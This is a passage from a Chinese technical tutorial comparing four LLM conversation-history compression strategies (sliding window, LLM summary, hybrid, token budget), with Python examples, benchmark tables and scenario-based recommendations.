<li><strong>对话长度一致</strong></li>
</ol>

<pre><code class="hljs">问题：如果消息都差不多长，Token动态优势不明显
数据：滑动窗口更简单、更快
替代：滑动窗口

典型：FAQ机器人（消息长度相似）
</code></pre>
<ol>
<li><strong>预算难以确定</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">问题：预算太低丢信息，太高浪费成本
数据：实测预算<span class="hljs-number">100</span>只保留<span class="hljs-number">40</span><span class="hljs-comment">%信息</span>
风险：需要反复调试预算

替代：滑动窗口（更可预测）或混合策略
</code></pre>
<ol>
<li><strong>需要保留用户信息</strong></li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">问题：Token动态不智能，按时间顺序删除
数据：预算<span class="hljs-number">100</span>时丢失<span class="hljs-string">"Tom"</span>、<span class="hljs-string">"28岁"</span>等关键信息
替代：LLM摘要或混合策略

典型：个性化助手、长期对话
</code></pre>
<hr/>
<h4 data-id="heading-68"><strong>预算设置建议</strong></h4>
<p>基于测试数据：</p>
<p><strong>推荐预算：200-300 tokens</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 标准场景（推荐）</span>
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">200</span>)
<span class="hljs-comment"># 约5轮，保留100%信息</span>

<span class="hljs-comment"># 宽松场景</span>
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">300</span>)
<span class="hljs-comment"># 约8轮，信息充足</span>

<span class="hljs-comment"># 严格限制</span>
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">100</span>)
<span class="hljs-comment"># 约2-3轮，可能丢失信息 ⚠️</span>
</code></pre>
<p><strong>预算计算公式：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 根据期望保留轮数估算</span>
expected_turns = <span class="hljs-number">5</span>  <span class="hljs-comment"># 期望保留5轮</span>
avg_tokens_per_turn = <span class="hljs-number">40</span>  <span class="hljs-comment"># 平均每轮40 tokens</span>
budget = expected_turns * avg_tokens_per_turn  <span class="hljs-comment"># 200 tokens</span>

<span class="hljs-comment"># 根据上下文窗口估算</span>
context_window = <span class="hljs-number">4000</span>  <span class="hljs-comment"># 模型上下文窗口</span>
system_prompt = <span class="hljs-number">100</span>  <span class="hljs-comment"># 系统提示</span>
response_budget = <span class="hljs-number">500</span>  <span class="hljs-comment"># 预留给回复</span>
budget = context_window - system_prompt - response_budget  <span class="hljs-comment"># 3400 tokens</span>
</code></pre>
<p><strong>动态调整：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveTokenCompressor</span>:
    <span class="hljs-string">"""根据对话长度动态调整预算"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm</span>):
        self.llm = llm
        self.base_budget = <span class="hljs-number">200</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 计算当前Token数</span>
        total_tokens = <span class="hljs-built_in">sum</span>(self.llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages)
        
        <span class="hljs-comment"># 动态调整预算</span>
        <span class="hljs-keyword">if</span> total_tokens &lt; <span class="hljs-number">200</span>:
            budget = total_tokens  <span class="hljs-comment"># 不压缩</span>
        <span class="hljs-keyword">elif</span> total_tokens &lt; <span class="hljs-number">500</span>:
            budget = <span class="hljs-number">200</span>  <span class="hljs-comment"># 标准压缩</span>
        <span class="hljs-keyword">else</span>:
            budget = <span class="hljs-number">300</span>  <span class="hljs-comment"># 宽松压缩（信息多）</span>
        
        compressor = TokenBasedCompressor(self.llm.count_tokens, max_tokens=budget)
        <span class="hljs-keyword">return</span> compressor.compress(messages)
</code></pre>
<hr/>
<h4 data-id="heading-69"><strong>最佳实践</strong></h4>
<p><strong>1. 设置最小保护</strong></p>
<p>修复"预算太低返回空"的问题：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBasedCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># ... 原有逻辑 ...</span>
        
        <span class="hljs-comment"># 最小保护：至少保留1条最新消息</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> compressed <span class="hljs-keyword">and</span> messages:
            compressed = [messages[-<span class="hljs-number">1</span>]]
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>2. 监控实际使用情况</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBasedCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, token_counter, max_tokens=<span class="hljs-number">200</span></span>):
        self.token_counter = token_counter
        self.max_tokens = max_tokens
        self.stats = {
            <span class="hljs-string">"total_compressions"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"total_original_tokens"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"total_compressed_tokens"</span>: <span class="hljs-number">0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        result = self._do_compress(messages)
        
        <span class="hljs-comment"># 统计</span>
        self.stats[<span class="hljs-string">"total_compressions"</span>] += <span class="hljs-number">1</span>
        self.stats[<span class="hljs-string">"total_original_tokens"</span>] += <span class="hljs-built_in">sum</span>(self.token_counter(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages)
        self.stats[<span class="hljs-string">"total_compressed_tokens"</span>] += <span class="hljs-built_in">sum</span>(self.token_counter(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result)
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_stats</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""获取统计数据"""</span>
        avg_original = self.stats[<span class="hljs-string">"total_original_tokens"</span>] / self.stats[<span class="hljs-string">"total_compressions"</span>]
        avg_compressed = self.stats[<span class="hljs-string">"total_compressed_tokens"</span>] / self.stats[<span class="hljs-string">"total_compressions"</span>]
        avg_rate = <span class="hljs-number">1</span> - avg_compressed / avg_original
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"avg_original_tokens"</span>: avg_original,
            <span class="hljs-string">"avg_compressed_tokens"</span>: avg_compressed,
            <span class="hljs-string">"avg_compression_rate"</span>: avg_rate
        }
</code></pre>
<p><strong>3. 与滑动窗口组合</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridTokenCompressor</span>:
    <span class="hljs-string">"""Token动态 + 滑动窗口组合"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, max_tokens=<span class="hljs-number">200</span>, max_turns=<span class="hljs-number">10</span></span>):
        self.token_compressor = TokenBasedCompressor(llm.count_tokens, max_tokens)
        self.sliding_compressor = SlidingWindowCompressor(keep_turns=max_turns)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 先用Token动态</span>
        result = self.token_compressor.compress(messages)
        
        <span class="hljs-comment"># 再用滑动窗口（双重保险）</span>
        result = self.sliding_compressor.compress(result)
        
        <span class="hljs-keyword">return</span> result
</code></pre>
<hr/>
<h4 data-id="heading-70"><strong>小结</strong></h4>
<p>Token动态压缩器的真实表现：</p>
<pre><code class="hljs language-diff" lang="diff">核心优势：
✅ 精确控制Token（误差&lt;5%）
✅ 速度极快（0.38ms）
✅ 零成本（$0）
✅ 充分利用预算

核心劣势：
❌ 可能比滑动窗口多用33-58% Token
❌ 信息保留完全依赖预算设置
❌ 预算太低会返回空
❌ 不如LLM摘要智能

定位：
精确控制Token数的工具
适合有明确预算限制的场景
不适合追求极致压缩或智能保留

最佳实践：
<span class="hljs-deletion">- 推荐预算：200-300 tokens</span>
<span class="hljs-deletion">- 监控实际使用情况</span>
<span class="hljs-deletion">- 设置最小保护（至少1条）</span>
<span class="hljs-deletion">- 根据场景动态调整</span>
</code></pre>
<p><strong>结论：Token动态是精确控制Token的最佳方案，但要理解它的权衡 - 用更多Token换取更精确的控制。</strong></p>
<hr/>
<h3 data-id="heading-71"><strong>3.6 四种策略总结对比</strong></h3>
<p>经过完整的测试，我们现在可以全面对比4种压缩策略。</p>
<h4 data-id="heading-72"><strong>核心数据对比</strong></h4>
<p>基于真实测试数据（长对话场景：20轮，560 tokens）：</p>






















































<table><thead><tr><th>维度</th><th>滑动窗口</th><th>LLM摘要</th><th>混合策略</th><th>Token动态</th></tr></thead><tbody><tr><td><strong>压缩后Token</strong></td><td><strong>145</strong> ⭐</td><td>597 ❌</td><td>604 ❌</td><td>193</td></tr><tr><td><strong>Token压缩率</strong></td><td><strong>74%</strong> ⭐</td><td>-7% ❌</td><td>-8% ❌</td><td>66%</td></tr><tr><td><strong>速度</strong></td><td><strong>0.00ms</strong> ⭐</td><td>13,446ms ❌</td><td>11,663ms ❌</td><td><strong>0.53ms</strong></td></tr><tr><td><strong>成本</strong></td><td><strong>$0</strong> ⭐</td><td>$0.0001</td><td>$0.0001</td><td><strong>$0</strong> ⭐</td></tr><tr><td><strong>信息保留</strong></td><td>0% ❌</td><td><strong>100%</strong> ⭐</td><td><strong>100%</strong> ⭐</td><td>依赖预算</td></tr><tr><td><strong>代码复杂度</strong></td><td>极简 ⭐</td><td>中等</td><td>高</td><td>低</td></tr></tbody></table>
<p><strong>关键发现：没有任何策略在所有维度都最优！</strong></p>
<hr/>
<h4 data-id="heading-73"><strong>详细对比表</strong></h4>
<p><strong>1. 性能指标对比</strong></p>








































<table><thead><tr><th>策略</th><th>短对话(5轮)</th><th>中等对话(10轮)</th><th>长对话(20轮)</th><th>超长对话(30轮)</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>126→126 (0%)</td><td>249→123 (51%)</td><td>560→145 (74%)</td><td>933→144 (85%)</td></tr><tr><td><strong>LLM摘要</strong></td><td>126→303 (-141%)</td><td>249→388 (-56%)</td><td>560→597 (-7%)</td><td>933→621 (33%)</td></tr><tr><td><strong>混合策略</strong></td><td>126→126 (0%)</td><td>249→123 (51%)</td><td>560→604 (-8%)</td><td>933→689 (26%)</td></tr><tr><td><strong>Token动态</strong></td><td>126→126 (0%)</td><td>249→194 (22%)</td><td>560→193 (66%)</td><td>933→191 (80%)</td></tr></tbody></table>
<p><strong>结论分析：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">短对话（≤<span class="hljs-number">5</span>轮）：
✅ 滑动窗口 = Token动态 = 混合策略
❌ LLM摘要（负优化，Token反增）

中等对话（<span class="hljs-number">10</span>轮）：
✅ 滑动窗口 = 混合策略（<span class="hljs-number">51</span><span class="hljs-comment">%压缩）</span>
⭕ Token动态（<span class="hljs-number">22</span><span class="hljs-comment">%压缩）</span>
❌ LLM摘要（负优化）

长对话（≥<span class="hljs-number">20</span>轮）：
✅ 滑动窗口（<span class="hljs-number">70</span>-<span class="hljs-number">85</span><span class="hljs-comment">%压缩）⭐</span>
⭕ Token动态（<span class="hljs-number">66</span>-<span class="hljs-number">80</span><span class="hljs-comment">%压缩）</span>
❌ LLM摘要、混合策略（负优化或低压缩）
</code></pre>
<hr/>
<p><strong>2. 速度对比</strong></p>








































<table><thead><tr><th>策略</th><th>短对话</th><th>中等对话</th><th>长对话</th><th>超长对话</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>0.00ms</td><td>0.00ms</td><td>0.00ms</td><td>0.01ms</td></tr><tr><td><strong>LLM摘要</strong></td><td>7,471ms</td><td>7,992ms</td><td>13,446ms</td><td>13,204ms</td></tr><tr><td><strong>混合策略</strong></td><td>0.01ms</td><td>0.01ms</td><td>11,663ms</td><td>14,809ms</td></tr><tr><td><strong>Token动态</strong></td><td>0.06ms</td><td>0.23ms</td><td>0.53ms</td><td>1.24ms</td></tr></tbody></table>
<p><strong>速度排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：0.00ms（基准）
<span class="hljs-bullet">2.</span> Token动态：0.38ms（慢，但&lt;1ms）
<span class="hljs-bullet">3.</span> LLM摘要：11,000ms（慢29,000倍）
<span class="hljs-bullet">4.</span> 混合策略：视场景（短对话0ms，长对话11,000ms）
</code></pre>
<hr/>
<p><strong>3. 成本对比</strong></p>








































<table><thead><tr><th>场景</th><th>滑动窗口</th><th>LLM摘要</th><th>混合策略</th><th>Token动态</th></tr></thead><tbody><tr><td>单次压缩</td><td>$0</td><td>$0.0001</td><td>$0-0.0001</td><td>$0</td></tr><tr><td>100次对话</td><td>$0</td><td>$0.01</td><td>$0.008</td><td>$0</td></tr><tr><td>日活10万</td><td>$0/天</td><td>$10/天</td><td>$8/天</td><td>$0/天</td></tr><tr><td>年成本</td><td><strong>$0</strong></td><td>$3,600</td><td>$2,880</td><td><strong>$0</strong></td></tr></tbody></table>
<p><strong>成本排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口、Token动态：$0 ⭐
<span class="hljs-bullet">2.</span> 混合策略：节省20% vs 纯LLM
<span class="hljs-bullet">3.</span> LLM摘要：最贵
</code></pre>
<hr/>
<p><strong>4. 信息保留对比</strong></p>
<p>测试场景：15轮对话，5个关键信息（Tom、28岁、上海、浦东、AI工程师）</p>



































<table><thead><tr><th>策略</th><th>保留率</th><th>详情</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td><strong>0%</strong> ❌</td><td>全部丢失</td></tr><tr><td><strong>LLM摘要</strong></td><td><strong>100%</strong> ✅</td><td>全部保留</td></tr><tr><td><strong>混合策略</strong></td><td><strong>100%</strong> ✅</td><td>全部保留（长对话时）</td></tr><tr><td><strong>Token动态(预算100)</strong></td><td><strong>40%</strong> ⚠️</td><td>仅保留部分</td></tr><tr><td><strong>Token动态(预算200)</strong></td><td><strong>100%</strong> ✅</td><td>全部保留</td></tr></tbody></table>
<p><strong>信息保留排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> LLM摘要、混合策略：100%（智能提取）
<span class="hljs-bullet">2.</span> Token动态：依赖预算（100→40%, 200→100%）
<span class="hljs-bullet">3.</span> 滑动窗口：0%（机械删除）
</code></pre>
<hr/>
<p><strong>5. 复杂度对比</strong></p>








































<table><thead><tr><th>策略</th><th>代码行数</th><th>配置项</th><th>调优难度</th><th>依赖</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>~10行</td><td>1个（轮数）</td><td>简单 ⭐</td><td>无</td></tr><tr><td><strong>Token动态</strong></td><td>~15行</td><td>1个（预算）</td><td>中等</td><td>Token计数器</td></tr><tr><td><strong>LLM摘要</strong></td><td>~30行</td><td>2个（轮数、Prompt）</td><td>中等</td><td>LLM API</td></tr><tr><td><strong>混合策略</strong></td><td>~50行</td><td>2个（阈值、轮数）</td><td>困难 ❌</td><td>以上全部</td></tr></tbody></table>
<p><strong>复杂度排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：最简单（3行核心代码）
<span class="hljs-bullet">2.</span> Token动态：简单（需设置预算）
<span class="hljs-bullet">3.</span> LLM摘要：中等（需Prompt工程）
<span class="hljs-bullet">4.</span> 混合策略：复杂（需调阈值，依赖多）
</code></pre>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e28c2d793bc041ff9fa03fa13ca6c485~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=mtXb74A12azpkLLGDKb5bvcDu00%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-74"><strong>优缺点矩阵</strong></h4>



































<table><thead><tr><th>策略</th><th>✅ 核心优势</th><th>❌ 核心劣势</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>• Token最少<br/>• 速度最快<br/>• 零成本<br/>• 极简实现</td><td>• 丢失所有早期信息<br/>• 不智能</td><td>短对话、成本敏感、实时场景</td></tr><tr><td><strong>LLM摘要</strong></td><td>• 100%信息保留<br/>• 智能提取</td><td>• 短对话负优化<br/>• 速度极慢<br/>• 有成本<br/>• 只在超长对话有效</td><td>超长对话（≥30轮）+ 需保留信息</td></tr><tr><td><strong>混合策略</strong></td><td>• 短对话=滑动窗口<br/>• 长对话保留信息<br/>• 自动切换</td><td>• 长对话Token多4-5倍<br/>• 速度慢<br/>• 有成本<br/>• 阈值难调</td><td>通用场景、用户体验优先</td></tr><tr><td><strong>Token动态</strong></td><td>• 精确控制Token<br/>• 速度快<br/>• 零成本<br/>• 充分利用预算</td><td>• Token比滑动窗口多33%<br/>• 信息保留靠预算<br/>• 预算难设置</td><td>有明确Token限制、消息长度差异大</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-75"><strong>场景推荐决策树</strong></h4>
<pre><code class="hljs language-erlang" lang="erlang">开始
 │
 ├─ 对话长度是否≤<span class="hljs-number">10</span>轮？
 │   ├─ 是 → 【滑动窗口】
 │   │        理由：简单、快速、零成本
 │   │
 │   └─ 否 → 是否需要保留用户信息？
 │       ├─ 否 → 【滑动窗口】
 │       │        理由：Token效率最高
 │       │
 │       └─ 是 → 有Token预算限制吗？
 │           ├─ 有 → 【Token动态】
 │           │        理由：精确控制预算
 │           │
 │           └─ 无 → 是否成本敏感？
 │               ├─ 是 → 【混合策略】
 │               │        理由：比纯LLM省<span class="hljs-number">20</span><span class="hljs-comment">%</span>
 │               │
 │               └─ 否 → 对话是否≥<span class="hljs-number">30</span>轮？
 │                   ├─ 是 → 【LLM摘要】
 │                   │        理由：唯一正收益场景
 │                   │
 │                   └─ 否 → 【混合策略】
 │                            理由：自动适应长度
</code></pre>
<hr/>
<h4 data-id="heading-76"><strong>分场景详细推荐</strong></h4>
<p><strong>场景1：FAQ机器人 / 快速问答</strong></p>
<pre><code class="hljs language-diff" lang="diff">特征：
<span class="hljs-deletion">- 对话：3-5轮</span>
<span class="hljs-deletion">- 消息：简短</span>
<span class="hljs-deletion">- 需求：快速响应</span>

推荐：滑动窗口 ⭐⭐⭐⭐⭐
理由：
✅ 对话短，不会丢失信息
✅ 速度最快
✅ 零成本
✅ 最简单

配置：
compressor = SlidingWindowCompressor(keep_turns=5)
</code></pre>
<hr/>
<p><strong>场景2：客服机器人 / 通用助手</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 对话：5-20轮不等
- 用户：需要记住背景
- 需求：体验 &gt; 成本

推荐：混合策略 ⭐⭐⭐⭐
理由：
✅ 短对话快速处理
✅ 长对话保留信息
✅ 自动适应
✅ 比纯LLM省20%成本

配置：
<span class="hljs-attr">compressor</span> = HybridCompressor(
    llm,
    <span class="hljs-attr">threshold_turns</span>=<span class="hljs-number">10</span>,
    <span class="hljs-attr">keep_recent_turns</span>=<span class="hljs-number">5</span>
)
</code></pre>
<hr/>
<p><strong>场景3：心理咨询 / 深度对话</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 对话：30-50轮
- 信息：密集、重要
- 需求：必须记住所有背景

推荐：LLM摘要 ⭐⭐⭐⭐
理由：
✅ 100%信息保留
✅ 智能提取关键信息
✅ 超长对话有正收益（33%压缩）

配置：
<span class="hljs-attr">compressor</span> = LLMSummaryCompressor(
    llm,
    <span class="hljs-attr">keep_recent_turns</span>=<span class="hljs-number">3</span>
)
</code></pre>
<hr/>
<p><strong>场景4：API网关 / Token严格限制</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 上下文：4K限制
- 消息：长度不一
- 需求：精确控制Token

推荐：Token动态 ⭐⭐⭐⭐⭐
理由：
✅ 精确控制（误差&lt;5%）
✅ 充分利用上下文
✅ 速度快
✅ 零成本

配置：
<span class="hljs-attr">compressor</span> = TokenBasedCompressor(
    llm.count_tokens,
    <span class="hljs-attr">max_tokens</span>=<span class="hljs-number">200</span>
)
</code></pre>
<hr/>
<p><strong>场景5：大规模免费产品</strong></p>
<pre><code class="hljs language-diff" lang="diff">特征：
<span class="hljs-deletion">- 用户：百万级</span>
<span class="hljs-deletion">- 预算：极度敏感</span>
<span class="hljs-deletion">- 需求：成本最低</span>

推荐：滑动窗口 ⭐⭐⭐⭐⭐
理由：
✅ 零成本
✅ 最快
✅ Token最少
✅ 可扩展性最强

配置：
compressor = SlidingWindowCompressor(keep_turns=3)
# 保留更少轮数，进一步降低成本
</code></pre>
<hr/>
<p><strong>场景6：高端VIP服务</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 用户：付费用户
- 需求：完美体验
- 预算：充足

推荐：混合策略 ⭐⭐⭐⭐⭐
理由：
✅ 用户体验最佳
✅ 自动适应对话长度
✅ 成本可接受

配置：
<span class="hljs-attr">compressor</span> = HybridCompressor(
    llm,
    <span class="hljs-attr">threshold_turns</span>=<span class="hljs-number">8</span>,  <span class="hljs-comment"># 更早用LLM</span>
    <span class="hljs-attr">keep_recent_turns</span>=<span class="hljs-number">5</span>
)
</code></pre>
<hr/>
<p><strong>场景7：企业内部工具 / 复杂项目讨论</strong></p>
<pre><code class="hljs language-ini" lang="ini">特征：
- 对话：20-40轮
- 信息：技术细节多
- 需求：不能丢失任何信息

推荐：LLM摘要 或 混合策略 ⭐⭐⭐⭐
理由：
✅ 保留所有技术细节
✅ 支持长时间讨论
✅ 内部工具，成本可控

配置：
<span class="hljs-comment"># 方案1：纯LLM摘要</span>
<span class="hljs-attr">compressor</span> = LLMSummaryCompressor(llm, keep_recent_turns=<span class="hljs-number">5</span>)

<span class="hljs-comment"># 方案2：混合策略</span>
<span class="hljs-attr">compressor</span> = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
</code></pre>
<hr/>
<p><strong>场景8：实时语音助手</strong></p>
<pre><code class="hljs language-diff" lang="diff">特征：
<span class="hljs-deletion">- 交互：实时语音</span>
<span class="hljs-deletion">- 延迟：&lt;100ms要求</span>
<span class="hljs-deletion">- 对话：5-10轮</span>

推荐：滑动窗口 ⭐⭐⭐⭐⭐
理由：
✅ 零延迟
✅ 对话不长，信息丢失风险低
✅ 最简单、最稳定

配置：
compressor = SlidingWindowCompressor(keep_turns=5)
</code></pre>
<hr/>
<h4 data-id="heading-77"><strong>组合策略推荐</strong></h4>
<p>有时单一策略无法满足需求，可以组合使用：</p>
<p><strong>组合1：混合策略 + 用户画像</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnhancedHybridCompressor</span>:
    <span class="hljs-string">"""混合策略 + 永久用户信息"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm</span>):
        self.hybrid = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
        self.user_profile = {}  <span class="hljs-comment"># 永久保存用户信息</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, user_id, messages</span>):
        <span class="hljs-comment"># 提取用户信息</span>
        self._extract_user_info(user_id, messages)
        
        <span class="hljs-comment"># 混合策略压缩</span>
        compressed = self.hybrid.compress(messages)
        
        <span class="hljs-comment"># 添加用户画像到开头</span>
        <span class="hljs-keyword">if</span> self.user_profile.get(user_id):
            profile_msg = {
                <span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>,
                <span class="hljs-string">"content"</span>: <span class="hljs-string">f"用户信息: <span class="hljs-subst">{self.user_profile[user_id]}</span>"</span>
            }
            compressed.insert(<span class="hljs-number">0</span>, profile_msg)
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>适用：个性化推荐、教育辅导</strong></p>
<hr/>
<p><strong>组合2：Token动态 + 关键信息提取</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartTokenCompressor</span>:
    <span class="hljs-string">"""Token动态 + 关键信息保护"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, max_tokens=<span class="hljs-number">200</span></span>):
        self.token_compressor = TokenBasedCompressor(
            llm.count_tokens, 
            max_tokens
        )
        self.key_entities = []  <span class="hljs-comment"># 关键实体</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 提取关键实体（姓名、地点等）</span>
        self._extract_entities(messages)
        
        <span class="hljs-comment"># Token动态压缩</span>
        compressed = self.token_compressor.compress(messages)
        
        <span class="hljs-comment"># 检查是否丢失关键实体</span>
        lost_entities = self._check_lost_entities(compressed)
        
        <span class="hljs-comment"># 如果丢失关键信息，放宽预算</span>
        <span class="hljs-keyword">if</span> lost_entities:
            self.token_compressor.max_tokens *= <span class="hljs-number">1.5</span>
            compressed = self.token_compressor.compress(messages)
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>适用：有Token限制但需保留关键信息</strong></p>
<hr/>
<p><strong>组合3：分级压缩</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TieredCompressor</span>:
    <span class="hljs-string">"""根据对话重要性分级压缩"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages, importance=<span class="hljs-string">"normal"</span></span>):
        <span class="hljs-keyword">if</span> importance == <span class="hljs-string">"critical"</span>:
            <span class="hljs-comment"># 重要对话：用LLM摘要</span>
            <span class="hljs-keyword">return</span> LLMSummaryCompressor(llm).compress(messages)
        <span class="hljs-keyword">elif</span> importance == <span class="hljs-string">"normal"</span>:
            <span class="hljs-comment"># 普通对话：用混合策略</span>
            <span class="hljs-keyword">return</span> HybridCompressor(llm).compress(messages)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 简单对话：用滑动窗口</span>
            <span class="hljs-keyword">return</span> SlidingWindowCompressor().compress(messages)
</code></pre>
<p><strong>适用：有明确优先级的场景</strong></p>
<hr/>
<h4 data-id="heading-78"><strong>快速选择指南</strong></h4>
<p><strong>按需求选择：</strong></p>
<pre><code class="hljs">需求                    → 推荐策略
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
成本最低               → 滑动窗口 / Token动态
速度最快               → 滑动窗口
Token最少              → 滑动窗口
精确控制Token          → Token动态
保留用户信息           → LLM摘要 / 混合策略
自动适应对话长度       → 混合策略
最简单实现             → 滑动窗口
生产通用方案           → 混合策略
</code></pre>
<p><strong>按对话特征选择：</strong></p>
<pre><code class="hljs">对话长度                → 推荐策略
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
≤5轮                   → 滑动窗口
5-10轮                 → 滑动窗口 / Token动态
10-20轮                → 混合策略 / Token动态
20-30轮                → 混合策略 / LLM摘要
≥30轮                  → LLM摘要
</code></pre>
<p><strong>按预算选择：</strong></p>
<pre><code class="hljs language-bash" lang="bash">预算情况                → 推荐策略
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
零预算                 → 滑动窗口 / Token动态
小预算(<span class="hljs-variable">$0</span>.01/次以内)   → 混合策略
预算充足               → LLM摘要
</code></pre>
<hr/>
<h4 data-id="heading-79"><strong>常见错误选择</strong></h4>
<p><strong>❌ 错误1：短对话用LLM摘要</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">场景：<span class="hljs-number">5</span>轮对话，<span class="hljs-number">126</span> tokens
选择：LLM摘要
结果：<span class="hljs-number">303</span> tokens（反增<span class="hljs-number">141</span><span class="hljs-comment">%）❌</span>

正确：滑动窗口 或 Token动态
原因：短对话不需要摘要，LLM反而啰嗦
</code></pre>
<hr/>
<p><strong>❌ 错误2：成本敏感场景用混合策略</strong></p>
<pre><code class="hljs language-bash" lang="bash">场景：日活10万，免费产品
选择：混合策略
结果：年成本<span class="hljs-variable">$2</span>,880 ❌

正确：滑动窗口
原因：零成本，可扩展性最好
</code></pre>
<hr/>
<p><strong>❌ 错误3：Token限制场景用滑动窗口</strong></p>
<pre><code class="hljs language-ini" lang="ini">场景：API限制4K tokens
选择：滑动窗口(10轮)
结果：有时10轮=150 tokens，有时=600 tokens ❌

正确：Token动态(<span class="hljs-attr">max_tokens</span>=<span class="hljs-number">200</span>)
原因：精确控制，不会超限
</code></pre>
<hr/>
<p><strong>❌ 错误4：实时场景用LLM摘要</strong></p>
<pre><code class="hljs">场景：语音助手，延迟&lt;100ms
选择：LLM摘要
结果：压缩耗时11秒，体验极差 ❌

正确：滑动窗口
原因：零延迟
</code></pre>
<hr/>
<p><strong>❌ 错误5：长对话只用滑动窗口</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">场景：30轮心理咨询
选择：滑动窗口(5轮)
结果：丢失所有早期背景 ❌
<span class="hljs-code">      用户需要重复说明
</span>
正确：LLM摘要 或 混合策略
原因：保留用户信息，体验更好
</code></pre>
<hr/>
<h4 data-id="heading-80"><strong>实战建议</strong></h4>
<p><strong>1. 从简单开始</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 第一步：先用滑动窗口</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)

<span class="hljs-comment"># 运行一段时间，观察问题：</span>
